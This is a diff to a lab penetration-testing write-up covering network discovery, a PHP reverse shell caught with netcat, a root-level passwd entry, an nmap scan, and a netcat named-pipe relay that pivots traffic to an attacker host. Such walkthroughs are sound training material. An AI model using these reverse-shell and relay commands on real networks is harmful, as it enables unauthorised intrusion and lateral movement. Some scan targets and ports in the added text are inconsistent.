@@ -84,34 +84,31 @@ This discovers a new IP in a new network: **172.16.50.222**
 
 ```
 <!--ens192    Link encap:Ethernet  HWaddr 00:50:56:a0:9c:e3  
-```
-
-```text
           inet addr:172.16.37.220  Bcast:172.16.37.255  Mask:255.255.255.0
           inet6 addr: fe80::250:56ff:fea0:9ce3/64 Scope:Link
           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-          RX packets:289106 errors:0 dropped:25 overruns:0 frame:0
-          TX packets:258265 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:720452 errors:0 dropped:32 overruns:0 frame:0
+          TX packets:590197 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1000 
-          RX bytes:31871667 (31.8 MB)  TX bytes:27932510 (27.9 MB)
+          RX bytes:108309918 (108.3 MB)  TX bytes:93850516 (93.8 MB)
 
 ens224    Link encap:Ethernet  HWaddr 00:50:56:a0:90:a2  
           inet addr:172.16.50.222  Bcast:172.16.50.255  Mask:255.255.255.0
           inet6 addr: fe80::250:56ff:fea0:90a2/64 Scope:Link
           UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
-          RX packets:31 errors:0 dropped:16 overruns:0 frame:0
-          TX packets:45 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:36 errors:0 dropped:20 overruns:0 frame:0
+          TX packets:48 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1000 
-          RX bytes:3622 (3.6 KB)  TX bytes:5363 (5.3 KB)
+          RX bytes:3922 (3.9 KB)  TX bytes:5611 (5.6 KB)
 
 lo        Link encap:Local Loopback  
           inet addr:127.0.0.1  Mask:255.0.0.0
           inet6 addr: ::1/128 Scope:Host
           UP LOOPBACK RUNNING  MTU:65536  Metric:1
-          RX packets:10841 errors:0 dropped:0 overruns:0 frame:0
-          TX packets:10841 errors:0 dropped:0 overruns:0 carrier:0
+          RX packets:18699 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:18699 errors:0 dropped:0 overruns:0 carrier:0
           collisions:0 txqueuelen:1 
-          RX bytes:808036 (808.0 KB)  TX bytes:808036 (808.0 KB)
+          RX bytes:1417948 (1.4 MB)  TX bytes:1417948 (1.4 MB)
 
 -->
 ```
@@ -245,7 +242,7 @@ Now that we have access to the ftp, **we can upload a PHP reverse shell**, and i
 {% tabs %}
 {% tab title="Netcat Listener \(local machine\)" %}
 ```
-nc -l 1235
+nc -l 1234
 ```
 {% endtab %}
 
@@ -496,6 +493,10 @@ test:x:1001:1002::/home/test:
 {% hint style="info" %}
 **ftpuser has root rights \(just use the same password\)**:
 
+```
+ftpuser:x:0:0::/home/ftpuser:/bin/bash
+```
+
 ```bash
 www-data@xubuntu:/home/ftpuser$ su ftpuser
 Password: 
@@ -515,5 +516,55 @@ You got the first machine!
 ```
 {% endhint %}
 
-We run nmap from this machine to discover 
+We run nmap from this machine to discover opened ports on 172.16.50.224
+
+{% tabs %}
+{% tab title="nmap \(on 172.16.50.224\) " %}
+```bash
+nmap 172.16.50.224 -sV -n -v -Pn -p- -T4 -oX portScan.xml
+```
+{% endtab %}
+
+{% tab title="Output" %}
+## Scanner
+
+> Generated on **Sun Jul 18 21:04:56 2021** with `nmap 7.01`.
+
+```bash
+nmap -sV -n -v -Pn -p- -T4 -oX portScan.xml --min-rate=5000 172.16.50.222
+```
+
+## Hosts Alive \(1\)
+
+| Host | OS | Accuracy |
+| :--- | :--- | :--- |
+| 172.16.50.222 |  | % |
+
+## Open Ports and Running Services
+
+### 172.16.50.222 \( - %\)
+
+| Port | State | Service | Version |
+| :--- | :--- | :--- | :--- |
+| 22/tcp | open | ssh | OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 |
+| 80/tcp | open | http | Apache httpd 2.4.18 |
+| 3307/tcp | open | tcpwrapped |  |
+{% endtab %}
+{% endtabs %}
+
+{% tabs %}
+{% tab title="Listener Relay on Attacker Machine" %}
+```bash
+~$ cd /tmp; mknod backpipe p
+~$ nc -lvp 111 0<backpipe | nc -lvp 222 | tee backpipe
+```
+{% endtab %}
+
+{% tab title="Client to Client Relay on Pivot Machine" %}
+```bash
+cd /tmp; mknod backpipe p 
+nc 172.16.50.222 2 0<backpipe | nc 10.13.37.11 111 | tee backpipe   
+```
+{% endtab %}
+{% endtabs %}
 
